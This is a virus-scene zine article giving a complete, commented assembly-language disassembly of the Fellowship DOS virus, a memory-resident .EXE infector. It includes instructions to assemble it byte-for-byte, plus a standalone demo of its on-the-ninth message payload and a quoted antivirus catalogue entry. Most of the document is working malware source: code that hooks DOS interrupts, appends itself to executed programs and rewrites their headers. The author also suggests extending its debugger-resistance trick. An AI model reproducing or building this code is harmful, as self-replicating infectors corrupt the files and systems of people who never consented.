                    ======================================
                      Disassembly of the Fellowship Virus
                           By The Attitude Adjuster
                    ======================================

        Well, I thought that I  should just continue disassembling whatever
 I could  find, as  part  of  that 'keeping  up  my  skills.' I found this, 
 decided  that it was a piece of uneventful and thouroghly boring, and none
 the more bug free code, and decided that you should have it...
 
        It seems  to  have  a semi-unique  way  of organization  during the
 memory residency...  the loading  of the host again, etc... also, there is
 a  tiny bit  of  debugger resistance,  but, this tactic  could be expanded
 upon to create huge amounts of hell for non-protected mode debuggers.
        
        Really, this  thing  shouldn't  work... if  it  follows theory,  it
 should eat  all available  handles on  the system after a few (more for us
 with higher FILES= settings) infections...
 
        This is what Patti says... notice, this is an EXE infector, yet one
 of the symptoms is COM growth! Wild... I never found that subroutine while
 I was disassembling...
 
 ==========================================================================
 Virus Name:  Fellowship
 Aliases:     1022, Better World, Fellow
 V Status:    Rare
 Discovered:  July, 1990
 Isolated:    Australia
 Symptoms:    TSR; .COM & .EXE file growth
 Origin:      Malaysia
 Eff Length:  1,019 - 1,027 Bytes
 Type Code:   PRsE - Parasitic Resident .EXE Infector
 Detection Method:  ViruScan, F-Prot, NAV, IBM Scan, AVTK, Novi, Sweep,
                    CPAV, UTScan, VirexPC, Gobbler2, VBuster, AllSafe,
                    ViruSafe, UTScan, Trend, Iris, VNet, Panda, VET,
                    Detect+, IBMAV, DrVirus, Vi-Spy,
                    NShld, LProt, CPAV/N, Sweep/N
 Removal Instructions:  CleanUp, F-Prot, NAV, or delete infected files

 General Comments:
       The Fellowship or 1022 virus was isolated in Australia in July 1990.
       Fellowship is a memory resident generic infector of .EXE files.  It
       does not infect .COM or overlay files.

       The first time a program infected with the Fellowship virus is
       executed, the virus will install itself memory resident as a 2,048
       byte TSR in low system memory.  Available free memory will be
       decreased by a corresponding 2,048 bytes.  Interrupt 21 will also
       now be controlled by the virus.

       After the virus is memory resident, the virus will infect .EXE files
       when they are executed.  Infected .EXE files will increase in size
       by between 1,019 and 1,027 bytes.  The virus's code will be located
       at the end of infected files.

       Infected files will contain the following text strings very close to
       the end of the file:

             "This message is dedicated to
              all fellow PC users on Earth
              Toward A Better Tomorrow
              And A Better Place To Live In"

             "03/03/90 KV KL MAL"

       This virus is believed to have originated in Kuala Lumpur, Malaysia.
 ==========================================================================
; Disassembly of the Fellowship Virus, done by The Attitude Adjuster for        
; Infectious Diseases Issue 3.

; For a byte-for-byte matchup, assemble as follows:
;  tasm fellow /m2
;  tlink fellow

.model tiny  
.code
        org     000h
start:
        mov     ax, 0D000h                              ; RUTHERE call
        int     21h
        cmp     bx, 1234h
        jne     installvirus                            ; if not...
        
        mov     bx, es
        add     bx, 10h                                 ; account for PSP
        add     word ptr cs:[oldcsip+2], bx             ; add to CS
        jmp     dword ptr cs:[oldcsip]                  ; get there...

ninthflag       db      0

paramblock:                                             ; need defs? get a
 envsegment     dw      0CE4h                           ; DOS manual...
 cmdlineoffset  db       80h,  00h
 cmdlinesegment dw      12C9h
 fcb1offset     db       5Ch,  00h
 fcb1segment    dw      12C9h
 fcb2offset     db       6Ch,  00h
 fcb2segment    dw      12C9h
 loadpoint      dw      0

oldcsip         dd      0FFF00000h

installvirus:
        cld                                             ; !!!
        cli
        push    es
        
        mov     bx, es
        add     bx, 10h                                 ; account for PSP
        mov     es, bx                                  ; ES = 1st EXE Seg
        
        xor     bx, bx
        mov     ds, bx                                  ; DS = 0000
        
        push    word ptr ds:[0000]                      ; save ssi vector
        push    word ptr ds:[0002]                      ; save ssi vector
        
        mov     word ptr ds:[0000], 0A5F3h              ; set ssi vector
        mov     byte ptr ds:[0002], 0CFh                ; 0CF00:0A5F3h
        
        xor     si, si
        mov     di, si
        
        push    cs
        pop     ds
        
        mov     ax, 64h                                 ; program entry
        mov     cx, endwrite-start                      ; zopy ieterations
        pushf                                           ; fake an interrupt
        push    es                                      ; return to 1st seg
        push    ax
        
        db      0EAh                                    ; jmp far ptr 0:0000
        db      00h,  00h,  00h,  00h
        
        ; on the fake interrupt call, control is transferred to 0000:0000,
        ; which contains

      ; rep     movsb
      ; iret
        
        ; the movsb takes care of copying the virus to offset 0000 of the
        ; 1st EXE segment, and then the iret returns the virus to the
        ; entry point below!

trueentry:        
        xor     ax, ax
        mov     ds, ax
        
        pop     word ptr ds:[0000]                      ; restore ssi vector
        pop     word ptr ds:[0002]
        
        sti                                             ; finally... yeesh!
        
        pop     es                                      ; PSP segment
        mov     bx, 80h
        mov     ax, 4A00h                               ; decrease allocation
        int     21h                                     ; of PSP segment
        
        push    cs
        pop     ds
        mov     ax, es
        
        mov     cmdlinesegment, ax                      ; construct exec
        mov     fcb1segment, ax                         ; parameter block
        mov     fcb2segment, ax                         ; (see block above)
        mov     ax, es:[002Ch]
        mov     envsegment, ax
        
        mov     ax, 3521h                               ; get int 21h vector
        int     21h
        
        mov     word ptr ds:[Old21], bx                 ; save vector
        mov     word ptr ds:[Old21+2], es
        
        mov     dx, offset int_21h_entry                ; set int 21h vectr
        mov     ax, 2521h
        int     21h
        
        mov     ah, 2Ah                                 ; get date
        int     21h
        
        cmp     dh, 9                                   ; the ninth?
        jne     dontsetflag
        or      byte ptr cs:[ninthflag], 1              ; flop that flipper
dontsetflag:
        cli
        mov     es, envsegment                          ; environment segmnt
        xor     di, di
        mov     cx, 0FFFFh
        mov     al, 0
        cld
searchloop:
        repne   scasb                                   ; scan until we
        cmp     es:[di], al                             ; meet a dupe of
        jne     searchloop                              ; ourselves!
        
        mov     dx, di
        add     dx, 3
        
        push    es                                      ; DS = PSP segment
        pop     ds
        
        mov     bx, cs                                  ; stack in us
        mov     ss, bx                                  ; might clear ints!!
        mov     es, bx
        mov     sp, 44Bh                                ; stack at 44bh
        mov     bx, offset paramblock
        mov     ax, 4B00h                               ; load + exec host
        pushf                                           ; fake int 21h
        sti
        call    dword ptr cs:[Old21]
        
        mov     es, cs:[envsegment]                     ; release memory
        mov     ax, 4900h
        int     21h
        
        mov     dx, 80h                                 ; terminate and keep
        mov     ax, 3100h                               ; us resident!
        int     21h

filesave        dw      469h,  74Bh
old24           dw      156h,  74Bh
savedvalu1      dw      8E0h
savedvalu2      dw      0
oldattr         dw      20h
readbuffer      db      4Dh
                db       5Ah, 0DBh,  00h,  07h,  00h,  00h
                db       00h,  20h,  00h,  00h,  00h, 0FFh
                db      0FFh,  00h,  00h,  00h,  00h
negativechksm   dw      1990h
                db       00h,  00h,  6Eh,  00h,  3Eh
                db      39 dup (0)
  
int_24h_entry:   
        xor     al, al
        iret
  
int_21h_entry:   
        cmp     ax, 0D000h                              ; RUTHERE?
        jne     checkforexecute                         ; No...
        mov     bx, 1234h
        iret

checkforexecute:
        cmp     ax, 4B00h                               ; load + execute?
        je      yeahyeahbaby                            ; yepparoo
        
        db      0EAh                                    ; jmp far orig 21h
old21   db      9Eh,  10h,  16h,  01h
        
        dw      ?, ?                                    ; ?!?

yeahyeahbaby:
        push    bp                                      ; save caller's
        push    ax                                      ; registers
        push    bx
        push    cx
        push    dx
        push    di
        push    si
        push    es
        push    ds
        test    byte ptr cs:[ninthflag], 1              ; test that flipper
        jz      notflagged
        jmp     itstheninthhoney

notflagged:
        mov     word ptr cs:[filesave], dx              ; save file seg:ofs
        mov     word ptr cs:[filesave+2], ds
        mov     si, dx
        
        mov     ah, 19h                                 ; get default drive
        int     21h
        mov     dl, al                                  ; drive code in DL
        
        cmp     byte ptr [si+1], 3Ah                    ; 2nd letter a ":"
        jne     notonanotherdisk
        
        mov     dl, byte ptr [si]                       ; get letter
        sub     dl, 'A'                                 ; reduce to d-code
notonanotherdisk:
        inc     dl                                      ; add 1, differing fc
        mov     ah, 36h                                 ; get free space
        int     21h
        
        cmp     ax, 0FFFFh                              ; error?
        je      getthefuckback
        
        xor     dx, dx
        mul     bx                                      ; avail. sectors
        mul     cx                                      ; avail. bytes
        
        cmp     ax, 7D0h                                ; enough left?
        jae     enoughleftdoit
        
        or      dx, dx                                  ; more than 65535?
        jnz     enoughleftdoit

getthefuckback:
        pop     ds                                      ; restore caller's
        pop     es                                      ; registers
        pop     si
        pop     di
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        pop     bp
        mov     ax, 4B00h
        jmp     dword ptr cs:[Old21]                    ; go to old 21h

enoughleftdoit:
        cld
        les     di, dword ptr cs:[filesave]             ; ES:DI = File seg:ofs
        mov     cx, 0FFFFh
        mov     al, 0
        repne   scasb                                   ; hunt out end
        
        mov     al, es:[di-2]
        and     al, 5Fh                                 ; capitalize
        cmp     al, 45h                                 ; 'E'
        jne     getthefuckback                          ; non an EXE!
        
        lds     dx, dword ptr cs:[filesave]             ; DS:DX = File seg:ofs
        mov     ax, 3D00h                               ; open file
        int     21h
        jc      getthefuckback
        
        mov     bx, ax                                  ; !!!
        
        push    cs
        pop     ds
        
        mov     dx, offset readbuffer                   ; read exe header
        mov     cx, 1Ch
        mov     ax, 3F00h
        int     21h
        jc      closeitupandleave                       ; oh, the sins...

        cmp     word ptr [negativechksm], 1990h         ; infected?
        jne     getonwithit
closeitupandleave:
        mov     ax, 3E00h                               ; close file
        int     21h
        jmp     short getthefuckback

getonwithit:        
        mov     ax, 3524h                               ; get int 24h vector
        int     21h
        
        mov     word ptr [Old24], bx                    ; save it
        mov     word ptr [Old24+2], es
        
        mov     dx, offset int_24h_entry                ; set int 24f vector
        mov     ax, 2524h
        int     21h
        
        lds     dx, dword ptr filesave                  ; DS:DX = file seg:ofs
        mov     ax, 4300h
        int     21h                                     ; get attributes
        jc      whatapity                               ; to err is computer
        
        mov     word ptr cs:[oldattr], cx               ; save attributes
        
        and     cx, 0FEh                                ; blank the boring
        mov     ax, 4301h
        int     21h                                     ; change attributes
        jnc     nowramitinthere
whatapity:
        lds     dx, dword ptr cs:[Old24]                ; restore int 24h
        mov     ax, 2524h                               ; vector
        int     21h
        jmp     getthefuckback

nowramitinthere:
        cld
        sti
        
        lds     dx, dword ptr cs:[filesave]             ; DS:DX = file seg:ofs
        mov     ax, 3D02h                               ; open read/write
        int     21h
        jc      whatapity
        
        mov     bx, ax                                  ; !!!
        
        push    cs
        pop     ds
        
        mov     cx, 200h                                ; 512 (bytes per par)
        
        mov     si, offset readbuffer                   ; header!
        
        mov     ax, [si+16h]                            ; initial CS
        mov     word ptr [oldcsip+2], ax
        
        mov     ax, [si+14h]                            ; initial IP
        mov     word ptr [oldcsip], ax
        
        mov     ax, [si+4]                              ; paragraphs
        cmp     word ptr [si+2], 0                      ; bizzare quirk
        je      notquirky
        dec     ax
notquirky:
        mul     cx                                      ; dx:ax = bytes 
        
        add     ax, [si+2]                              ; add modulo
        adc     dx, 0
        
        add     ax, 0Fh                                 ; add 16 mo'
        adc     dx, 0
        
        and     ax, 0FFF0h
        
        mov     word ptr [savedvalu1], ax               ; save new CS:IP
        mov     word ptr [savedvalu2], dx               ; (still in bytes!!)
        
        add     ax, endwrite-start                      ; add virus length
        adc     dx, 0
        
        div     cx                                      ; cx in paragraphs
        or      dx, dx
        jz      notquirkier
        inc     ax                                      ; quirk again
notquirkier:
        mov     [si+4], ax                              ; replace paragraphs
        mov     [si+2], dx                              ; replace modulo

        mov     ax, word ptr [savedvalu1]               ; load saved CS:IP
        mov     dx, word ptr [savedvalu2]               ; (still in bytes!!)
        
        mov     cx, 10h                                 ; paragraphs
        div     cx
        
        sub     ax, [si+8]                              ; loose header size
        
        mov     [si+16h], ax                            ; replace IP
        mov     ax, 0
        mov     [si+14h], ax                            ; replace cs
        mov     word ptr [si+12h], 1990h                ; show as infected
        
        mov     dx, word ptr [savedvalu1]               ; move to end as
        mov     cx, word ptr [savedvalu2]               ; shown by header
        mov     ax, 4200h
        int     21h
        
        mov     cx, endwrite-start                      ; write the virus!
        mov     dx, offset ds:[0]
        mov     ax, 4000h                               ; !!!
        int     21h
        jc      thisistheendmyonlyfriend                ; an error, this far?
        
        xor     cx, cx                                  ; seek top
        mov     dx, cx                                  ; !!!
        mov     ax, 4200h
        int     21h

        mov     dx, offset readbuffer                   ; write buffer
        mov     cx, 1Ch
        mov     ax, 4000h
        int     21h

thisistheendmyonlyfriend:
        mov     ax, 3E00h                               ; close file
        int     21h
        
        lds     dx, dword ptr [filesave]                ; DS:DX = File Seg:ofs
        
        mov     cx, cs:[oldattr]                        ; restore attribs
        mov     ax, 4301h
        int     21h
        jmp     whatapity                               ; restore int 24h

savemode        db      0
charcolor       db      0
                
nicemessage1    db      'This message is dedicated to  $'
nicemessage2    db      'all fellow PC users on Earth  $'
nicemessage3    db      '  Towards A Better Tomorrow   $'
nicemessage4    db      'And A Better Place To Live In $'

itstheninthhoney:
        push    cs
        pop     ds
        mov     ah, 0Fh                                 ; get video mode
        int     10h
        
        mov     byte ptr [savemode], al                 ; save mode

        mov     ax, 5                                   ; set mode 40x25
        int     10h
        
        mov     byte ptr [charcolor], 1
        
        mov     dh, 9
        call    setcursor
        
        mov     dx, offset nicemessage1
        call    printstring
        
        mov     dh, 0Ah
        call    setcursor
        
        mov     dx, offset nicemessage2
        call    printstring
        
        mov     byte ptr [charcolor], 2
        
        mov     dh, 0Ch
        call    setcursor
        
        mov     dx, offset nicemessage3
        call    printstring
        
        mov     dh, 0Dh
        call    setcursor
        
        mov     dx, offset nicemessage4
        call    printstring
        
        mov     cx, 0FFFFh                              ; kill time
killloop:
        lodsb
        loop    killloop
  
        xor     ax, ax                                  ; wait fo' a key
        int     16h
        
        mov     al, byte ptr [savemode]                 ; restore old mode
        mov     ah, 0                                   ; on the vid
        int     10h
        jmp     getthefuckback                          ; GO HOME!
  
printstring:           
        cld
        mov     si, dx
printloop:
        lodsb
        cmp     al, '$'
        je      alldoneprinting                         ; end of string
        
        mov     ah, 0Eh                                 ; write a byte
        mov     bh, 0                                   ; to tha' vid
        mov     bl, byte ptr [charcolor]
        int     10h
        
        jmp     short printloop
alldoneprinting:
        ret
  
setcursor:
        mov     dl, 5                                   ; set cursor pos
        mov     ah, 2
        mov     bh, 0
        int     10h
        ret
  
        db      ' 03/03/90 KV KL MAL '                  ; whee...
endwrite:
        end     start
 ==========================================================================
; Stand alone demonstration of the Fellowship Virus activation routine.

; Assemble with:
;  tasm fbomb /m2
;  tlinl fbomb /t

.model tiny  
.code
        org     0100h
start:
        jmp     short itstheninthhoney

savemode        db      0
charcolor       db      0
                
nicemessage1    db      'This message is dedicated to  $'
nicemessage2    db      'all fellow PC users on Earth  $'
nicemessage3    db      '  Towards A Better Tomorrow   $'
nicemessage4    db      'And A Better Place To Live In $'

itstheninthhoney:
        push    cs
        pop     ds
        mov     ah, 0Fh                                 ; get video mode
        int     10h
        
        mov     byte ptr [savemode], al                 ; save mode

        mov     ax, 5                                   ; set mode 40x25
        int     10h
        
        mov     byte ptr [charcolor], 1
        
        mov     dh, 9
        call    setcursor
        
        mov     dx, offset nicemessage1
        call    printstring
        
        mov     dh, 0Ah
        call    setcursor
        
        mov     dx, offset nicemessage2
        call    printstring
        
        mov     byte ptr [charcolor], 2
        
        mov     dh, 0Ch
        call    setcursor
        
        mov     dx, offset nicemessage3
        call    printstring
        
        mov     dh, 0Dh
        call    setcursor
        
        mov     dx, offset nicemessage4
        call    printstring
        
        mov     cx, 0FFFFh                              ; kill time
killloop:
        lodsb
        loop    killloop
  
        xor     ax, ax                                  ; wait fo' a key
        int     16h
        
        mov     al, byte ptr [savemode]                 ; restore old mode
        mov     ah, 0                                   ; on the vid
        int     10h
        int     20h  

printstring:           
        cld
        mov     si, dx
printloop:
        lodsb
        cmp     al, '$'
        je      alldoneprinting                         ; end of string
        
        mov     ah, 0Eh                                 ; write a byte
        mov     bh, 0                                   ; to tha' vid
        mov     bl, byte ptr [charcolor]
        int     10h
        
        jmp     short printloop
alldoneprinting:
        ret
  
setcursor:
        mov     dl, 5                                   ; set cursor pos
        mov     ah, 2
        mov     bh, 0
        int     10h
        ret
  
        db      ' 03/03/90 KV KL MAL '                  ; whee...
endwrite:
        end     start
 ==========================================================================

